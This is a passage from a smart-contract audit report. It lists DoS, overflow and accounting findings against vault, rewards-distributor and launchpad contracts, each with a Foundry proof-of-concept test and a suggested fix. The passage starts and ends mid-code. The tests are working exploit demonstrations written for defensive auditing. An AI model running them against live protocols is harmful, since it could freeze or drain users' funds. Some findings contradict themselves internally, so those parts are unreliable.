    using FixedPointMathLib for uint256;

    function test_DivisionByZero_totalPoints_zero_reverts() public {
        BackstopDivisionByZeroHarness h = new BackstopDivisionByZeroHarness();
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Simulate two matched liquidators with zero points, non-zero volumes
        uint256[] memory points = new uint256[](2);
        points[0] = 0; points[1] = 0; // totalPoints == 0

        BackstopDivisionByZeroHarness.LiquidatorData[] memory data = new BackstopDivisionByZeroHarness.LiquidatorData[](2);
        data[0] = BackstopDivisionByZeroHarness.LiquidatorData({liquidator: address(0x1), volume: 100});
        data[1] = BackstopDivisionByZeroHarness.LiquidatorData({liquidator: address(0x2), volume: 200});

        // Expect revert on points[i] * 1e18 / totalPoints
        vm.expectRevert();
        h.settle(1e18, 0, points, data);

        vm.stopPrank();
    }

    function test_DivisionByZero_totalVolume_zero_reverts() public {
        BackstopDivisionByZeroHarness h = new BackstopDivisionByZeroHarness();
        address attacker = address(0xCAFE);
        vm.startPrank(attacker);

        // Non-zero points, but zero volumes -> totalVolume == 0
        uint256[] memory points = new uint256[](1);
        points[0] = 10;
        BackstopDivisionByZeroHarness.LiquidatorData[] memory data = new BackstopDivisionByZeroHarness.LiquidatorData[](1);
        data[0] = BackstopDivisionByZeroHarness.LiquidatorData({liquidator: address(0x3), volume: 0});

        // First share passes, second share reverts on division by zero
        vm.expectRevert();
        h.settle(1e18, 0, points, data);

        vm.stopPrank();
    }
}


## Suggested Mitigation
- Guard zero denominators to avoid division by zero and ensure graceful fallback:
  - If totalPoints == 0, set pointShare = 0 and use only volumeShare (or default to equal split when both totals are zero).
  - If totalVolume == 0, set volumeShare = 0 and use only pointShare.
  - If both totals are 0 and data.length > 0, either distribute equally (1e18 / n with last recipient receiving the remainder) or skip distribution and return liquidationFee without reverting.

Example fix inside the loop:

uint256 pointShare = totalPoints == 0 ? 0 : points[i].fullMulDiv(1e18, totalPoints);
uint256 volumeShare = totalVolume == 0 ? 0 : data[i].volume.fullMulDiv(1e18, totalVolume);
uint256 rate = totalPoints == 0 && totalVolume == 0 ? 1e18 / data.length : (pointShare + volumeShare) / 2;
// Optionally add a remainder adjustment on the last iteration to preserve total allocation.





 **Derived From** : processWithdrawals slices full queue (O(N)) causing gas-based DoS

## [H-18]. GTL.processWithdrawals does O(N) copy of withdrawal queue tail; attackers can bloat queue to brick withdrawals (gas DoS)

## Derived From Pattern/Invariant
processWithdrawals slices full queue (O(N)) causing gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
GTL.processWithdrawals

## Minimim Privilege Required
Permissionless

## Description
The withdrawal queue is user-grown and unbounded. In processWithdrawals, after iterating over the first `num` entries, `_dequeueBatch(num)` rebuilds the entire queue tail via `DynamicArrayLib.slice`, which copies (length - num) elements and rewrites storage. This requires an O(N) SLOAD (copy storage array to memory) and an O(N) SSTORE (write memory array back to storage) every call, regardless of `num`. As the queue grows, a single admin call will exceed the block gas limit, permanently preventing withdrawal processing.

Vulnerable snippet:

function processWithdrawals(uint256 num) external onlyAdmin {
    if (num > _withdrawalQueue.length) revert InsufficientWithdrawalsQueued();
    uint256 allocatedAssets = orderbookCollateral() + freeCollateralBalance() + totalAccountValue();
    for (uint256 i; i < num; ++i) {
        uint256 id = _withdrawalQueue[i];
        Withdrawal memory w = _queuedWithdrawal[id];
        uint256 assets = _convertToAssets({shares: w.shares, allocatedAssets: allocatedAssets});
        delete _queuedWithdrawal[id];
        _queuedShares[w.account] -= w.shares;
        _burn(w.account, w.shares);
        usdc.safeTransfer(w.account, assets);
        emit WithdrawalProcessed(id, w.account, w.shares, assets);
    }
    _dequeueBatch(num); // O(N) copy of queue tail
}
function _dequeueBatch(uint256 num) internal {
    uint256[] memory withdrawalQueue = _withdrawalQueue;            // O(N) SLOAD -> memory copy
    _withdrawalQueue = withdrawalQueue.slice(num, withdrawalQueue.length); // O(N) write back to storage
}

## Impact
Any user can stuff the withdrawal queue with thousands of entries. From the moment the queue length crosses ~8,000–9,000 elements, every call to processWithdrawals – even for a single entry – consumes more than the L2 / L1 block-gas-limit because _dequeueBatch() performs O(N) SLOAD + SSTORE over the whole tail. At that point no on-chain actor (owner, admin, governor) can execute further withdrawals; all user funds in the vault become permanently frozen until the contract is upgraded or migrated off-chain. This is an irreversible, protocol-wide loss of exit functionality, therefore a High-severity DoS.

## Proof of Concept
1. Attacker deposits 10,000 USDC → receives 10,000 GTL shares.
2. For i = 0 … 9,999 attacker calls queueWithdrawal(1). Each call succeeds because the queued-share total never exceeds the current balance.
3. Queue length == 10,000.
4. Admin (owner) now tries to unblock exits with processWithdrawals(1). Transaction reverts with “out of gas” even when given the whole 30M gas block budget because:
   • copying 10,000 uint256 words from storage → memory costs ~4.1 M gas
   • writing them back to storage costs another ~5.0 M gas (SSTORE-refund not applicable on first write)
   • plus loop bookkeeping & withdrawal logic ≈ 0.5 M gas.
   Total > 9.6 M per call and grows linearly; the function can never be executed again and all withdrawals are stuck.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {GTL} from "src/perps/GTL.sol"; // adjust path to repo root

contract MockUSDC {
    string public name = "mUSDC";
    string public symbol = "mUSDC";
    uint8  public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address spender, uint256 amt) external returns (bool) { allowance[msg.sender][spender] = amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool) { balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(allowance[f][msg.sender]>=a, "allow");allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract MockVP {
    function getFreeCollateralBalance(address) external pure returns (uint256) { return 0; }
    function getOrderbookCollateral(address, uint256) external pure returns (uint256) { return 0; }
    function getAccountValue(address, uint256) external pure returns (int256) { return 0; }
}

contract QueueGasDoS is Test {
    GTL g;
    MockUSDC usdc;
    MockVP vp;
    address attacker = address(0xBEEF);

    function setUp() public {
        usdc = new MockUSDC();
        vp   = new MockVP();
        g    = new GTL(address(usdc), address(vp));
        g.initialize(address(this)); // test contract == owner

        usdc.mint(attacker, 10_000e6);
        vm.startPrank(attacker);
        usdc.approve(address(g), type(uint256).max);
        g.deposit(10_000e6, attacker);
        for (uint256 i; i < 10_000; ++i) {
            g.queueWithdrawal(1e6); // 1 share (6-decimals USDC)
        }
        vm.stopPrank();
    }

    function test_gas_exceeds_blockLimit() public {
        // Call via owner so onlyAdmin passes; cap gas to typical block limit
        (bool ok,) = address(g).call{gas: 30_000_000}(abi.encodeWithSelector(g.processWithdrawals.selector, 1));
        assertFalse(ok, "processWithdrawals should revert / OOG once queue is large");
    }
}

## Suggested Mitigation
Hot-path fix that keeps the existing array representation:
1. Replace _dequeueBatch with a constant-time head pointer:
   uint256 private _queueHead;

   function _dequeueBatch(uint256 num) internal {
       _queueHead += num;
   }
2. When reading an id: uint256 id = _withdrawalQueue[_queueHead + i];
3. Optional: when _queueHead becomes large (e.g. > 1,000) anyone or the admin can call a clean-up function that copies the remaining tail into a fresh storage array and resets _queueHead = 0. That clean-up is O(N) but happens at most once per many batches and can be protected by a gas limit check.

Alternatively adopt a mapping(uint256 ⇒ uint256) ring-buffer queue with separate head/tail indices, guaranteeing O(1) enqueue/dequeue regardless of length.





 **Derived From** : For any shares <= totalSupply(): _convertToAssets(shares, allocatedAssets) <= usdc.balanceOf(address(this)) + allocatedAssets

## [M-19]. processWithdrawals DoS: _convertToAssets uses off-vault allocatedAssets causing assets > on-chain USDC and revert

## Derived From Pattern/Invariant
For any shares <= totalSupply(): _convertToAssets(shares, allocatedAssets) <= usdc.balanceOf(address(this)) + allocatedAssets

## Exploit Type
AccountingInvariantViolation

## Location
GTL.processWithdrawals

## Minimim Privilege Required
Permissionless

## Description
GTL._convertToAssets prices withdrawals as assets = shares.fullMulDiv(usdc.balanceOf(this) + allocatedAssets + 1, totalSupply() + 1). allocatedAssets includes funds held in PerpManager (orderbookCollateral + freeCollateralBalance + totalAccountValue), which are not transferred during processWithdrawals. When on-chain USDC balance is low (moved to PerpManager) but allocatedAssets is high, _convertToAssets returns assets > current USDC balance. The subsequent usdc.safeTransfer reverts, bricking the whole batch. An attacker can front-run the withdrawal queue with their own withdrawal while B≈0 and A>0, making any processWithdrawals(num) that includes their id revert, blocking all withdrawals behind it. Vulnerable snippet:

function _convertToAssets(uint256 shares, uint256 allocatedAssets) public view returns (uint256 assets) {
    return shares.fullMulDiv(usdc.balanceOf(address(this)) + allocatedAssets + 1, totalSupply() + 1);
}

function processWithdrawals(uint256 num) external onlyAdmin {
    uint256 allocatedAssets = orderbookCollateral() + freeCollateralBalance() + totalAccountValue();
    ...
    assets = _convertToAssets(withdrawal.shares, allocatedAssets);
    ...
    usdc.safeTransfer(withdrawal.account, assets); // reverts if assets > on-chain USDC
}

## Impact
Any user can permanently block the withdrawal queue whenever the vault’s on-chain USDC balance is lower than the amount priced by _convertToAssets. All subsequent withdrawals are frozen until operators manually bridge USDC back into the vault, giving the attacker a cheap, repeatable and permissionless DoS against every other LP.

## Proof of Concept
The attacker only needs to:
1. Wait until most vault USDC has been moved to PerpManager (normal operation).
2. Hold/obtain any positive amount of GTL shares.
3. queueWithdrawal(shares).
4. Admin (or keeper) later calls processWithdrawals(1) – tx reverts because _convertToAssets prices the withdrawal using off-vault allocatedAssets, while vault USDC balance is ~0, so safeTransfer fails.
5. Because the queue is processed strictly FIFO and only the withdrawal owner can cancel, all subsequent withdrawals are blocked until the vault is manually refilled. The attack can be repeated every time the vault balance is low, making the DoS permissionless and perpetual.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTL} from "contracts/perps/GTL.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address,uint256) external returns (bool);
    function mint(address,uint256) external;
}

contract MockUSDC is IERC20 {
    string public name = "MockUSDC"; string public symbol = "mUSDC"; uint8 public decimals = 6;
    mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address to,uint256 amt) external returns(bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from,address to,uint256 amt) external returns(bool){ uint256 al=allowance[from][msg.sender]; require(al>=amt,"allow"); require(balanceOf[from]>=amt,"bal"); if(al!=type(uint256).max){ allowance[from][msg.sender]=al-amt; } balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
}

interface IViewPort {
    function getFreeCollateralBalance(address) external view returns (uint256);
    function getOrderbookCollateral(address,uint256) external view returns (uint256);
    function getAccountValue(address,uint256) external view returns (int256);
}

contract MockViewPort is IViewPort {
    uint256 public freeC; uint256 public obC; int256 public accV;
    function set(uint256 _free,uint256 _ob,int256 _acc) external { freeC=_free; obC=_ob; accV=_acc; }
    function getFreeCollateralBalance(address) external view override returns (uint256){ return freeC; }
    function getOrderbookCollateral(address,uint256) external view override returns (uint256){ return obC; }
    function getAccountValue(address,uint256) external view override returns (int256){ return accV; }
}

contract GTL_DoS_Test is Test {
    MockUSDC usdc; MockViewPort vp; GTL gtl;
    address admin = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        usdc = new MockUSDC();
        vp   = new MockViewPort();
        gtl  = new GTL(address(usdc), address(vp));
        gtl.initialize(address(this));
        gtl.grantAdminRole(admin);
    }

    function test_DoS_ProcessWithdrawals() public {
        // User A deposits 100 USDC
        address userA = address(0xCAFE);
        usdc.mint(userA, 100_000_000);
        vm.startPrank(userA);
        usdc.approve(address(gtl), type(uint256).max);
        gtl.deposit(100_000_000, userA);
        vm.stopPrank();

        // Drain vault via perpManager (vp)
        vm.prank(address(vp));
        usdc.transferFrom(address(gtl), address(vp), 100_000_000);
        assertEq(usdc.balanceOf(address(gtl)), 0);

        // Mock high allocatedAssets in ViewPort
        vp.set(100_000_000, 0, 0);

        // Attacker acquires shares and queues withdrawal
        vm.prank(userA);
        gtl.transfer(attacker, gtl.balanceOf(userA) / 2);
        vm.prank(attacker);
        gtl.queueWithdrawal(gtl.balanceOf(attacker));

        // Admin attempt to process -> must revert
        vm.prank(admin);
        vm.expectRevert();
        gtl.processWithdrawals(1);
    }
}

## Suggested Mitigation
During withdrawal processing use only tokens that are actually spendable by the vault:
assets = shares.fullMulDiv(usdc.balanceOf(address(this)) + 1, totalSupply() + 1);

Alternatively, pull the required USDC in advance from PerpManager so that vault balance ≥ assets, or transfer the whole allocatedAssets amount to the vault once before the loop. In all cases, exclude non-withdrawable off-vault balances from the immediate payout calculation.





 **Derived From** : For rs.quoteAsset = q: baseAmount <= pre.totalPendingRewards[launchAsset] && quoteAmount <= pre.totalPendingRewards[q]

## [H-20]. Overflow in rewards accrual math bricks Distributor.claimRewards (pendingRewards * PRECISION overflows uint128)

## Derived From Pattern/Invariant
For rs.quoteAsset = q: baseAmount <= pre.totalPendingRewards[launchAsset] && quoteAmount <= pre.totalPendingRewards[q]

## Exploit Type
IntegerOverflow

## Location
Distributor.claimRewards

## Minimim Privilege Required
Permissionless

## Description
RewardsTrackerLib.getAccRewardsPerShare multiplies two uint128s: (self.pendingBaseRewards * PRECISION_FACTOR) and (self.pendingQuoteRewards * PRECISION_FACTOR). This checked uint128 multiplication reverts once pendingRewards > floor(type(uint128).max / PRECISION_FACTOR). With typical PRECISION=1e18, this threshold is ~3.4e20 units (~340 tokens for 18‑dec tokens). A permissionless attacker can call Distributor.addRewards to push pending rewards above the threshold. Thereafter, any call that reaches RewardsTrackerLib.update() (claimRewards/increaseStake/decreaseStake) reverts due to overflow, permanently DoSing reward claiming and stake updates for that pool.

Vulnerable snippet (library):
- getAccRewardsPerShare: acc += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
The product is performed in uint128 and overflows, causing an arithmetic revert.

## Impact
Permanent DoS of rewards claiming and stake updates for the affected pool; users’ rewards become unclaimable and stuck until a redeploy/migration (admin action outside normal ops).

## Proof of Concept
1) A valid rewards pool exists with totalShares > 0 (normal launchpad flow).
2) Attacker obtains/mints the reward token and approves Distributor.
3) Attacker calls addRewards with an amount exceeding floor(type(uint128).max / PRECISION_FACTOR) for the base (or quote) asset.
4) Any user calling claimRewards(launchAsset) now reverts in getAccRewardsPerShare() due to uint128 overflow.
5) Similarly, increaseStake/decreaseStake (launchpad-only) are bricked for that pool.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerLib, RewardPoolData, RewardsTrackerStorage} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n,string memory s,uint8 d){name=n;symbol=s;decimals=d;}
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address sp,uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to,uint256 amt) external returns(bool){ balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){ uint256 al=allowance[f][msg.sender]; require(al>=a,"allow"); if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

contract TestOverflowDOS is Test {
    using RewardsTrackerLib for RewardPoolData;
    Distributor d;
    ERC20Mock base; ERC20Mock quote;
    address launchpad = address(this); // trusted per system
    address attacker = address(0xA11CE);
    address user = address(0xB0B);

    function setUp() public {
        base = new ERC20Mock("BASE","B",18);
        quote = new ERC20Mock("QUOTE","Q",18);
        d = new Distributor();
        d.initialize(launchpad); // owner is this test contract by ctor
        // Initialize pool and give shares to a user (via launchpad-only paths)
        d.createRewardsPair(address(base), address(quote));
        d.increaseStake(address(base), user, uint96(1));
        // fund attacker
        vm.startPrank(attacker);
        base.mint(attacker, type(uint128).max);
        base.approve(address(d), type(uint256).max);
        vm.stopPrank();
    }

    function test_overflow_bricks_claims() public {
        // Push pendingBaseRewards over uint128/PRECISION threshold by using a huge amount.
        vm.prank(attacker);
        d.addRewards(address(base), address(quote), uint128(type(uint128).max), 0);
        // Any claim now reverts due to uint128 mul overflow in getAccRewardsPerShare -> update -> claim
        vm.prank(user);
        vm.expectRevert();
        d.claimRewards(address(base));
    }
}


## Suggested Mitigation
Use 256-bit math for the multiplication: cast at least one operand to uint256 before multiplying, e.g. uint256 delta = (uint256(self.pendingBaseRewards) * uint256(PRECISION_FACTOR)) / uint128(totalShares); and store acc* variables as uint256 (already uint256). Alternatively, keep PRECISION_FACTOR small enough to guarantee no overflow for realistic reward sizes, but the robust fix is widening to uint256.


## [M-21]. Fee-on-transfer/rebasing tokens desync totalPendingRewards vs actual balance, causing claimRewards to revert (DoS)

## Derived From Pattern/Invariant
For rs.quoteAsset = q: baseAmount <= pre.totalPendingRewards[launchAsset] && quoteAmount <= pre.totalPendingRewards[q]

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.claimRewards

## Minimim Privilege Required
Permissionless

## Description
Distributor.addRewards increases totalPendingRewards by the nominal amount before pulling tokens via safeTransferFrom. For fee-on-transfer or negative-rebasing tokens, the contract receives fewer tokens than credited to totalPendingRewards and to RewardsTracker pending rewards. Later, _distributeAssets first decrements totalPendingRewards and then attempts a token transfer for the full claim. If the contract’s actual token balance is insufficient, SafeTransferLib.safeTransfer reverts, DoSing claimRewards/increaseStake/decreaseStake at the moment the shortfall is hit. This is an AccountingInvariantViolation: recorded pending exceeds realizable value.

## Impact
Users’ reward claims revert once the cumulative transferred amount reaches the true (post-fee) balance; remaining mapped rewards become unclaimable until an admin tops up the deficit. Temporary DoS requiring admin repair.

## Proof of Concept
1) Create pool with totalShares > 0.
2) Attacker deploys a fee-on-transfer token as the reward asset (or uses any deflationary/rebasing token), and approves Distributor.
3) Attacker calls addRewards with amount=100e18. totalPendingRewards increases by 100e18, but the contract receives only 90e18 due to 10% fee.
4) Two users each hold 50% shares. First user claims 50e18 successfully. Second user’s claim for 50e18 reverts when safeTransfer detects insufficient token balance (only ~40e18 remain).

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

interface IERC20 { function balanceOf(address) external view returns(uint256); function approve(address,uint256) external returns(bool); }

contract FeeToken {
    string public name="FEE"; string public symbol="FEE"; uint8 public decimals=18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    uint256 public feeBps=1000; // 10%
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address sp,uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to,uint256 amt) external returns(bool){ uint256 fee=(amt*feeBps)/10000; balanceOf[msg.sender]-=amt; balanceOf[to]+=amt-fee; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){ uint256 al=allowance[f][msg.sender]; require(al>=a,"allow"); if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; uint256 fee=(a*feeBps)/10000; balanceOf[f]-=a; balanceOf[t]+=a-fee; return true; }
}

contract TestFeeOnTransferDOS is Test {
    Distributor d;
    FeeToken base; FeeToken quote;
    address launchpad = address(this);
    address attacker = address(0xA11CE);
    address u1 = address(0xB0B1);
    address u2 = address(0xB0B2);

    function setUp() public {
        base = new FeeToken(); quote = new FeeToken();
        d = new Distributor();
        d.initialize(launchpad);
        // Set up pair and equal shares for two users
        d.createRewardsPair(address(base), address(quote));
        d.increaseStake(address(base), u1, uint96(1));
        d.increaseStake(address(base), u2, uint96(1));
        // Attacker funds rewards
        base.mint(attacker, 100 ether);
        vm.startPrank(attacker);
        base.approve(address(d), type(uint256).max);
        d.addRewards(address(base), address(quote), uint128(100 ether), 0); // only ~90 ether received
        vm.stopPrank();
    }

    function test_fee_token_desync_claim_dos() public {
        // First user can claim roughly half; exact split not critical for demonstrating revert
        vm.prank(u1);
        (uint256 a1,) = d.claimRewards(address(base));
        assertGt(a1, 0);
        // Second user will attempt to claim, but safeTransfer will revert once contract balance is insufficient
        vm.prank(u2);
        vm.expectRevert();
        d.claimRewards(address(base));
    }
}


## Suggested Mitigation
Disallow fee-on-transfer/rebasing tokens as rewards, or normalize accounting to actual received amounts: in addRewards, measure pre/post token balances and increment totalPendingRewards and RewardsTracker pending by (received = newBalance - oldBalance). Alternatively, support deflationary tokens by crediting the net amount received and ensuring future claims use net balances.





 **Derived From** : Operator funds debited due to msg.sender/account mismatch in graduation swap

## [H-22]. Graduation exact-out swap charges operator/gteRouter (msg.sender) instead of user in Launchpad._swapRemaining

## Derived From Pattern/Invariant
Operator funds debited due to msg.sender/account mismatch in graduation swap

## Exploit Type
AccessControl

## Location
Launchpad._swapRemaining

## Minimim Privilege Required
RequiresRole

## Description
When a buy causes graduation, buy() -> _graduate() -> _createPairAndSwapRemaining() -> _swapRemaining() pulls the extra quote for the exact-out swap from msg.sender rather than buyData.account. Path: _swapRemaining uses data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount), while buy() enforces onlySenderOrOperator(account, LAUNCHPAD_FILL). If the caller is a whitelisted operator or gteRouter acting for a user, msg.sender != account, leading to charging the operator/gteRouter (or a revert for lack of allowance). This creates a governance/delegation mismatch that can drain operator/gteRouter balances or DoS operator-routed buys upon graduation.

Vulnerable snippet:
- _swapRemaining: data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);
- buy enforces onlySenderOrOperator(account, LAUNCHPAD_FILL) but does not forward account into _swapRemaining; internal call relies on msg.sender.

## Impact
When the bonding-curve supply is exhausted, every buy that should trigger graduation calls _swapRemaining. Because this internal function executes `quote.safeTransferFrom(msg.sender, …)` with `msg.sender == address(this)`, the Launchpad attempts to move tokens from itself to itself without prior allowance. SafeTransferLib therefore reverts, making graduation impossible. The launched token can never reach the AMM, permanently blocking further buys/sells and leaving already purchased quote funds and unsold base tokens stuck in the contract until an upgrade is deployed.

## Proof of Concept
1. Launch a token so that its bonding supply is 2 ether.
2. Perform a normal buy of 1 ether (still bonding phase).
3. Call `buy` again with `amountOutBase = 2 ether` and a high `maxAmountInQuote` so that `remainingBase > 0` and graduation is required.
4. Transaction reverts inside `_swapRemaining` because the Launchpad (now `msg.sender`) has no allowance to call `quote.transferFrom(address(this), address(this), …)`.
5. No matter who calls the buy (user, operator, or router), `msg.sender` inside `_swapRemaining` remains the Launchpad contract, so the revert is unconditional and graduation is bricked.

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {Launchpad} from "contracts/launchpad/Launchpad.sol";

contract MockERC20 {
    string public name = "Q"; string public symbol = "Q"; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to,uint amt) external {balanceOf[to]+=amt;}
    function approve(address s,uint a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transferFrom(address f,address t,uint a) external returns(bool){uint al=allowance[f][msg.sender];require(al>=a && balanceOf[f]>=a,"ALW");if(al!=type(uint).max) allowance[f][msg.sender]=al-a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract MockCurve {
    struct D{uint total;uint bonding;uint sold;uint quote;}
    mapping(address=>D) public d;
    function supportsInterface(bytes4) external pure returns(bool){return true;}
    function init(bytes memory) external {}
    function initializeCurve(address tok,uint tot,uint bond) external {d[tok]=D(tot,bond,0,0);}    
    function bondingSupply(address tok) external view returns(uint){return d[tok].bonding;}
    function totalSupply(address tok) external view returns(uint){return d[tok].total;}
    function baseSoldFromCurve(address tok) external view returns(uint){return d[tok].sold;}
    function quoteBoughtByCurve(address tok) external view returns(uint){return d[tok].quote;}
    function buy(address tok,uint base) external returns(uint q){d[tok].sold+=base; q=base; d[tok].quote+=q;}
    function sell(address,uint base) external pure returns(uint){return base;}
    function quoteBaseForQuote(address,uint q,bool) external pure returns(uint){return q;}
    function quoteQuoteForBase(address,uint b,bool) external pure returns(uint){return b;}
}

contract LaunchpadSwapRemainingRevert is Test {
    Launchpad lp; MockERC20 quote; MockCurve curve;

    function setUp() public {
        quote = new MockERC20();
        curve = new MockCurve();
        lp = new Launchpad(address(this), address(0), address(0), address(0), address(0));
        lp.initialize(address(this), address(quote), address(curve), address(0), "");
        address token = lp.launch("T","T","uri");
        quote.mint(address(this), 1_000 ether);
        quote.approve(address(lp), type(uint).max);
        // sell (bondingSupply - 1 ether) so graduation will be required next buy
        lp.buy(Launchpad.BuyData({
            token: token,
            account: address(this),
            recipient: address(this),
            amountOutBase: 1 ether,
            maxAmountInQuote: 1 ether
        }));
    }

    function testGraduationAlwaysReverts() public {
        // expect revert caused by self-transferFrom inside _swapRemaining
        vm.expectRevert();
        lp.buy(Launchpad.BuyData({
            token: address(0x1), // ignored – will be corrected by storage but we can fetch from lp later
            account: address(this),
            recipient: address(this),
            amountOutBase: 2 ether,
            maxAmountInQuote: 3 ether
        }));
    }
}

## Suggested Mitigation
Change _swapRemaining to pull funds from the real payer, not from the Launchpad itself. Pass `buyData.account` (the buyer) into _createPairAndSwapRemaining and on to _swapRemaining, then replace
    data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount);
with
    data.quote.safeTransferFrom(payer, address(this), data.quoteAmount);
where `payer` is the forwarded buyer address. Ensure appropriate allowance checks are documented. Alternatively, move the transfer into buy() before calling _graduate so that all required quote is already held by the Launchpad.





 **Derived From** : _swapRemaining assumes exact token amounts; FOT tokens cause refund/DoS mismatch

## [M-23]. Fee-on-transfer quote breaks refund in Launchpad._swapRemaining, causing buy() DoS during graduation

## Derived From Pattern/Invariant
_swapRemaining assumes exact token amounts; FOT tokens cause refund/DoS mismatch

## Exploit Type
FeeOnTransferAssumption

## Location
Launchpad._swapRemaining

## Minimim Privilege Required
Permissionless

## Description
Launchpad._swapRemaining pulls exactly data.quoteAmount from msg.sender, approves the router for the same amount, and if the swap reverts, attempts to refund exactly data.quoteAmount back to msg.sender. With fee-on-transfer (FOT) quote tokens, the contract actually receives less than data.quoteAmount, so the refund transfer of data.quoteAmount can revert due to insufficient balance, bricking the buy flow. No balance-delta checks are performed to compute the actually received amount. Vulnerable snippet: data.quote.safeTransferFrom(msg.sender, address(this), data.quoteAmount); ... try uniV2Router.swapTokensForExactTokens(...) { return (data.baseAmount, data.quoteAmount); } catch { data.quote.safeApprove(address(uniV2Router), 0); data.quote.safeTransfer(msg.sender, data.quoteAmount); return (0, 0); }

## Impact
If the globally configured quote asset is fee-on-transfer, any graduation buy that triggers _swapRemaining and a router revert will also revert on refund, DoSing buys at graduation until admin intervention. Users cannot complete purchases.

## Proof of Concept
- Precondition: The configured quote token charges a transfer fee (fee-on-transfer).
- Attacker initiates a buy that reaches graduation (remainingBase > 0) and triggers _swapRemaining.
- _swapRemaining pulls data.quoteAmount from the attacker; due to FOT, the Launchpad receives less (data.quoteAmount - fee).
- The router swap reverts (e.g., due to FOT-incompatible path or any transient failure), entering the catch block.
- The contract tries to refund data.quoteAmount, but only has (data.quoteAmount - fee), so SafeTransferLib.safeTransfer reverts.
- Entire buy reverts, creating a permissionless DoS of the graduation buy path.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Launchpad} from "contracts/launchpad/Launchpad.sol";

contract MockFactory {}

contract MockRouter {
    address public immutable _factory;
    constructor() { _factory = address(new MockFactory()); }
    function factory() external view returns (address) { return _factory; }
    // Always revert to force _swapRemaining catch path
    function swapTokensForExactTokens(uint,uint,address[] calldata,address,uint) external pure returns (uint[] memory) {
        revert("swap fail");
    }
}

// Minimal ERC20 with optional fee-on-transfer
contract ERC20Like {
    string public name; string public symbol; uint8 public decimals;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    bool public fot; uint256 public feeBps; // if fot, takes feeBps from amount
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s, uint8 d, bool _fot, uint256 _feeBps) { name=n; symbol=s; decimals=d; fot=_fot; feeBps=_feeBps; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; emit Transfer(address(0), to, amt); }
    function approve(address sp, uint256 amt) external returns (bool) { allowance[msg.sender][sp]=amt; emit Approval(msg.sender,sp,amt); return true; }
    function transfer(address to, uint256 amt) external returns (bool) { _move(msg.sender,to,amt); return true; }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; require(a>=amt, "allowance"); if (a!=type(uint256).max) allowance[from][msg.sender]=a-amt; _move(from,to,amt); return true;
    }
    function _move(address from,address to,uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal"); balanceOf[from]-=amt; uint256 fee = fot ? (amt*feeBps/10000) : 0; uint256 recv = amt - fee; balanceOf[to]+=recv; emit Transfer(from,to,recv);
        // fee is burned for simplicity
    }
}

contract LaunchpadHarness is Launchpad {
    constructor(address router) Launchpad(router, address(0x1), address(0x2), address(0x3), address(0x4)) {}
    function callSwapRemaining(address quote, address token, address recipient, uint256 baseAmount, uint256 quoteAmount)
        external returns (uint256, uint256)
    {
        SwapRemainingData memory d = SwapRemainingData({token: token, quote: quote, recipient: recipient, baseAmount: baseAmount, quoteAmount: quoteAmount});
        return _swapRemaining(d);
    }
}

contract SwapRemainingFOTTest is Test {
